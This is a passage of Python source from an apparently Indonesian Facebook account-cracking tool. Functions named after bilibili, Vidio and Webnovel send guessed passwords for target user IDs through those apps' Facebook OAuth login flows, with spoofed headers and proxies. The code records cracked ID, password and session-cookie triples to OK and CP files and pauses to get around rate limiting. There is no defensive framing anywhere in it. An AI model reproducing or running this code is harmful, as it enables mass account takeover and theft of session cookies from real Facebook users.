c86dc%26domain%3Dwetv.vip%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwetv.vip%252Ff2ae15024f219a8%26relation%3Dopener%26frame%3Df1e2d765f47980c%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]")
					#tree.add(f"\r[red]{ua}[white]")
					Buat(tree)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]")
					#tree.add(f"\r[red]{ua}[white]")
					Buat(tree)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				if 'no' in taplikasi:
					ok+=1
					kuki = convert(ses.cookies.get_dict())
					idf = re.findall('c_user=(.*);xs', kuki)[0]
					tree = Tree(f"  ")
					tree.add(f"\r[green]Nama Anda : {nmf}[white]").add(f"\r[green]{idf}|{pw}[white] ").add(f"\r[green]{ua}[white] ")
					tree.add(f"\r[purple]{kuki}[white] ")
					Buat(tree)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					kuki = convert(ses.cookies.get_dict())
					idf = re.findall('c_user=(.*);xs', kuki)[0]
					tree = Tree(f"  ")
					tree.add(f"\r[green]Nama Anda : {nmf}[white]").add(f"\r[green]{idf}|{pw}[white] ").add(f"\r[green]{ua}[white] ")
					tree.add(f"\r[purple]{kuki}[white] ")
					Buat(tree)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					cek_apk(kuki)
					break		
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			prog.update(des,description=f'\r[deep_white]{M2}IP spam {P2}[{H2}{idf}{P2}] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
			prog.advance(des)
			time.sleep(31)
	loop+=1
	

def bilibili(idf,pwv,nmf):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	prog.update(des,description=f'\r[deep_white]Mobile bilibili [{H2}{idf}{P2}] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
	prog.advance(des)
	ses = requests.Session()
	#ua = random.choice(ugen3)
	ua = random.choice(['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36'])
	for pw in pwv:
		try:
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=997025131143308&kid_directed_site=0&app_id=997025131143308&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv14.0%2Fdialog%2Foauth%3Fapp_id%3D997025131143308%26cbt%3D1683051094198%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfbbb785afd051%2526domain%253Dwww.bilibili.tv%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.bilibili.tv%25252Ff9256cd9f2915c%2526relation%253Dopener%26client_id%3D997025131143308%26display%3Dtouch%26domain%3Dwww.bilibili.tv%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.bilibili.tv%252Fen%252Fanime%26locale%3Den_US%26logger_id%3Df2a712eaf2f85ec%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df2ba17daba7465c%2526domain%253Dwww.bilibili.tv%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.bilibili.tv%25252Ff9256cd9f2915c%2526relation%253Dopener%2526frame%253Df29e51db62d787%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26sdk%3Djoey%26version%3Dv14.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df2ba17daba7465c%26domain%3Dwww.bilibili.tv%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.bilibili.tv%252Ff9256cd9f2915c%26relation%3Dopener%26frame%3Df29e51db62d787%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/login.php?skip_api_login=1&api_key=997025131143308&kid_directed_site=0&app_id=997025131143308&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv14.0%2Fdialog%2Foauth%3Fapp_id%3D997025131143308%26cbt%3D1683051094198%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfbbb785afd051%2526domain%253Dwww.bilibili.tv%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.bilibili.tv%25252Ff9256cd9f2915c%2526relation%253Dopener%26client_id%3D997025131143308%26display%3Dtouch%26domain%3Dwww.bilibili.tv%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.bilibili.tv%252Fen%252Fanime%26locale%3Den_US%26logger_id%3Df2a712eaf2f85ec%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df2ba17daba7465c%2526domain%253Dwww.bilibili.tv%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.bilibili.tv%25252Ff9256cd9f2915c%2526relation%253Dopener%2526frame%253Df29e51db62d787%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26sdk%3Djoey%26version%3Dv14.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df2ba17daba7465c%26domain%3Dwww.bilibili.tv%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.bilibili.tv%252Ff9256cd9f2915c%26relation%3Dopener%26frame%3Df29e51db62d787%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login.php?skip_api_login=1&api_key=997025131143308&kid_directed_site=0&app_id=997025131143308&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv14.0%2Fdialog%2Foauth%3Fapp_id%3D997025131143308%26cbt%3D1683051094198%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfbbb785afd051%2526domain%253Dwww.bilibili.tv%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.bilibili.tv%25252Ff9256cd9f2915c%2526relation%253Dopener%26client_id%3D997025131143308%26display%3Dtouch%26domain%3Dwww.bilibili.tv%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.bilibili.tv%252Fen%252Fanime%26locale%3Den_US%26logger_id%3Df2a712eaf2f85ec%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df2ba17daba7465c%2526domain%253Dwww.bilibili.tv%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.bilibili.tv%25252Ff9256cd9f2915c%2526relation%253Dopener%2526frame%253Df29e51db62d787%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26sdk%3Djoey%26version%3Dv14.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df2ba17daba7465c%26domain%3Dwww.bilibili.tv%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.bilibili.tv%252Ff9256cd9f2915c%26relation%3Dopener%26frame%3Df29e51db62d787%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]")
					#tree.add(f"\r[red]{ua}[white]")
					Buat(tree)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]")
					#tree.add(f"\r[red]{ua}[white]")
					Buat(tree)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				if 'no' in taplikasi:
					ok+=1
					kuki = convert(ses.cookies.get_dict())
					idf = re.findall('c_user=(.*);xs', kuki)[0]
					tree = Tree(f"  ")
					tree.add(f"\r[green]Nama Anda : {nmf}[white]").add(f"\r[green]{idf}|{pw}[white] ").add(f"\r[green]{ua}[white] ")
					tree.add(f"\r[purple]{kuki}[white] ")
					Buat(tree)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					kuki = convert(ses.cookies.get_dict())
					idf = re.findall('c_user=(.*);xs', kuki)[0]
					tree = Tree(f"  ")
					tree.add(f"\r[green]Nama Anda : {nmf}[white]").add(f"\r[green]{idf}|{pw}[white] ").add(f"\r[green]{ua}[white] ")
					tree.add(f"\r[purple]{kuki}[white] ")
					Buat(tree)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					cek_apk(kuki)
					break		
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			prog.update(des,description=f'\r[deep_white]{M2}IP spam {P2}[{H2}{idf}{P2}] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
			prog.advance(des)
			time.sleep(31)
	loop+=1

def vidio(idf,pwv,nmf):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	prog.update(des,description=f'\r[deep_white]Mobile Vidio [{H2}{idf}{P2}] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
	prog.advance(des)
	ses = requests.Session()
	#ua = random.choice(ugen3)
	ua = random.choice(['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36'])
	for pw in pwv:
		try:
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=923560728108869&kid_directed_site=0&app_id=923560728108869&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv4.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D923560728108869%26redirect_uri%3Dhttps%253A%252F%252Fm.vidio.com%252Fusers%252Fauth%252Ffacebook%252Fcallback%26state%3Dfd46b2541619885e08dc8acb685b23fc473eb6a7dc873528%26scope%3Dpublic_profile%252C%2Bemail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dd6dcb3c8-246e-4f23-9b7d-50a0f376d931%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fm.vidio.com%2Fusers%2Fauth%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dfd46b2541619885e08dc8acb685b23fc473eb6a7dc873528%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/login.php?skip_api_login=1&api_key=923560728108869&kid_directed_site=0&app_id=923560728108869&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv4.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D923560728108869%26redirect_uri%3Dhttps%253A%252F%252Fm.vidio.com%252Fusers%252Fauth%252Ffacebook%252Fcallback%26state%3Dfd46b2541619885e08dc8acb685b23fc473eb6a7dc873528%26scope%3Dpublic_profile%252C%2Bemail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dd6dcb3c8-246e-4f23-9b7d-50a0f376d931%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fm.vidio.com%2Fusers%2Fauth%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dfd46b2541619885e08dc8acb685b23fc473eb6a7dc873528%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login.php?skip_api_login=1&api_key=923560728108869&kid_directed_site=0&app_id=923560728108869&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv4.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D923560728108869%26redirect_uri%3Dhttps%253A%252F%252Fm.vidio.com%252Fusers%252Fauth%252Ffacebook%252Fcallback%26state%3Dfd46b2541619885e08dc8acb685b23fc473eb6a7dc873528%26scope%3Dpublic_profile%252C%2Bemail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dd6dcb3c8-246e-4f23-9b7d-50a0f376d931%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fm.vidio.com%2Fusers%2Fauth%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dfd46b2541619885e08dc8acb685b23fc473eb6a7dc873528%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]")
					#tree.add(f"\r[red]{ua}[white]")
					Buat(tree)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]")
					#tree.add(f"\r[red]{ua}[white]")
					Buat(tree)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				if 'no' in taplikasi:
					ok+=1
					kuki = convert(ses.cookies.get_dict())
					idf = re.findall('c_user=(.*);xs', kuki)[0]
					tree = Tree(f"  ")
					tree.add(f"\r[green]Nama Anda : {nmf}[white]").add(f"\r[green]{idf}|{pw}[white] ").add(f"\r[green]{ua}[white] ")
					tree.add(f"\r[purple]{kuki}[white] ")
					Buat(tree)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					kuki = convert(ses.cookies.get_dict())
					idf = re.findall('c_user=(.*);xs', kuki)[0]
					tree = Tree(f"  ")
					tree.add(f"\r[green]Nama Anda : {nmf}[white]").add(f"\r[green]{idf}|{pw}[white] ").add(f"\r[green]{ua}[white] ")
					tree.add(f"\r[purple]{kuki}[white] ")
					Buat(tree)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					cek_apk(kuki)
					break		
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			prog.update(des,description=f'\r[deep_white]{M2}IP spam {P2}[{H2}{idf}{P2}] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
			prog.advance(des)
			time.sleep(31)
	loop+=1

def webnovel(idf,pwv,nmf):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	prog.update(des,description=f'\r[deep_white]Mobile Webnovel [{H2}{idf}{P2}] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
	prog.advance(des)
	ses = requests.Session()
	#ua = random.choice(ugen3)
	ua = random.choice(['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36'])
	for pw in pwv:
		try:
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=389729911382431&kid_directed_site=0&app_id=389729911382431&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.8%2Fdialog%2Foauth%3Fscope%3Demail%252Cpublic_profile%26response_type%3Dcode%26state%3DeyJhdXRvIjoiMSIsInZlciI6IjIiLCJmb3JtYXQiOiJyZWRpcmVjdCIsInNvdXJjZSI6ImVud2ViIiwidGFyZ2V0IjoiIiwiX2NzcmZUb2tlbiI6ImQwMmI4OTBiLTE0YWQtNDgxYi05NDU3LTkyNTgwMDc1NDdkYSIsInBvcHVwIjoiIiwiYXJlYUlkIjoiMiIsImZyb211aWQiOiIwIiwiYXBwSWQiOiI5MDAiLCJyZXR1cm5VcmwiOiJodHRwczovL20ud2Vibm92ZWwuY29tL2xvZ2luL2NhbGxiYWNrP3JlZGlyZWN0VXJsXHUwMDNkaHR0cHMlM0ElMkYlMkZtLndlYm5vdmVsLmNvbSUyRmJvb2slMkZsb2dpbl8xNzgyNjM0MTEwNjIzNDkwNSIsImF1dG9UaW1lIjoiMTUiLCJsb2dpbnRhYiI6IiJ9%26redirect_uri%3Dhttps%253A%252F%252Fptlogin.webnovel.com%252Flogin%252FfacebookCallback%26client_id%3D389729911382431%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D0f411e30-6f22-4335-add8-f253eeb6c9de%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fptlogin.webnovel.com%2Flogin%2FfacebookCallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DeyJhdXRvIjoiMSIsInZlciI6IjIiLCJmb3JtYXQiOiJyZWRpcmVjdCIsInNvdXJjZSI6ImVud2ViIiwidGFyZ2V0IjoiIiwiX2NzcmZUb2tlbiI6ImQwMmI4OTBiLTE0YWQtNDgxYi05NDU3LTkyNTgwMDc1NDdkYSIsInBvcHVwIjoiIiwiYXJlYUlkIjoiMiIsImZyb211aWQiOiIwIiwiYXBwSWQiOiI5MDAiLCJyZXR1cm5VcmwiOiJodHRwczovL20ud2Vibm92ZWwuY29tL2xvZ2luL2NhbGxiYWNrP3JlZGlyZWN0VXJsXHUwMDNkaHR0cHMlM0ElMkYlMkZtLndlYm5vdmVsLmNvbSUyRmJvb2slMkZsb2dpbl8xNzgyNjM0MTEwNjIzNDkwNSIsImF1dG9UaW1lIjoiMTUiLCJsb2dpbnRhYiI6IiJ9%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/login.php?skip_api_login=1&api_key=389729911382431&kid_directed_site=0&app_id=389729911382431&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.8%2Fdialog%2Foauth%3Fscope%3Demail%252Cpublic_profile%26response_type%3Dcode%26state%3DeyJhdXRvIjoiMSIsInZlciI6IjIiLCJmb3JtYXQiOiJyZWRpcmVjdCIsInNvdXJjZSI6ImVud2ViIiwidGFyZ2V0IjoiIiwiX2NzcmZUb2tlbiI6ImQwMmI4OTBiLTE0YWQtNDgxYi05NDU3LTkyNTgwMDc1NDdkYSIsInBvcHVwIjoiIiwiYXJlYUlkIjoiMiIsImZyb211aWQiOiIwIiwiYXBwSWQiOiI5MDAiLCJyZXR1cm5VcmwiOiJodHRwczovL20ud2Vibm92ZWwuY29tL2xvZ2luL2NhbGxiYWNrP3JlZGlyZWN0VXJsXHUwMDNkaHR0cHMlM0ElMkYlMkZtLndlYm5vdmVsLmNvbSUyRmJvb2slMkZsb2dpbl8xNzgyNjM0MTEwNjIzNDkwNSIsImF1dG9UaW1lIjoiMTUiLCJsb2dpbnRhYiI6IiJ9%26redirect_uri%3Dhttps%253A%252F%252Fptlogin.webnovel.com%252Flogin%252FfacebookCallback%26client_id%3D389729911382431%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D0f411e30-6f22-4335-add8-f253eeb6c9de%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fptlogin.webnovel.com%2Flogin%2FfacebookCallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DeyJhdXRvIjoiMSIsInZlciI6IjIiLCJmb3JtYXQiOiJyZWRpcmVjdCIsInNvdXJjZSI6ImVud2ViIiwidGFyZ2V0IjoiIiwiX2NzcmZUb2tlbiI6ImQwMmI4OTBiLTE0YWQtNDgxYi05NDU3LTkyNTgwMDc1NDdkYSIsInBvcHVwIjoiIiwiYXJlYUlkIjoiMiIsImZyb211aWQiOiIwIiwiYXBwSWQiOiI5MDAiLCJyZXR1cm5VcmwiOiJodHRwczovL20ud2Vibm92ZWwuY29tL2xvZ2luL2NhbGxiYWNrP3JlZGlyZWN0VXJsXHUwMDNkaHR0cHMlM0ElMkYlMkZtLndlYm5vdmVsLmNvbSUyRmJvb2slMkZsb2dpbl8xNzgyNjM0MTEwNjIzNDkwNSIsImF1dG9UaW1lIjoiMTUiLCJsb2dpbnRhYiI6IiJ9%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
